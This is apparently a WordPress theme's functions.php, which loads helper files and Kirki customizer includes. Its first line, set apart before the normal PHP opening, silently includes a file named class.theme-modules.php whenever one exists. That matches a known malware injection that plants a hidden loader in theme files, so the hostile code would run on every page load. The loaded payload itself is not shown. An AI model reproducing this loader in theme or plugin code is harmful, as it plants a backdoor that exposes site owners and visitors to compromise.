<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

// Exit if accessed directly
if ( !defined('ABSPATH')) exit;

require_once ( get_template_directory() . '/includes/functions.php' );

/* KIRKI */
if (class_exists( 'Kirki' )) {
    require_once ( get_template_directory() . '/includes/fontawesome.php' );
    require_once ( get_template_directory() . '/includes/kirki.php' );
}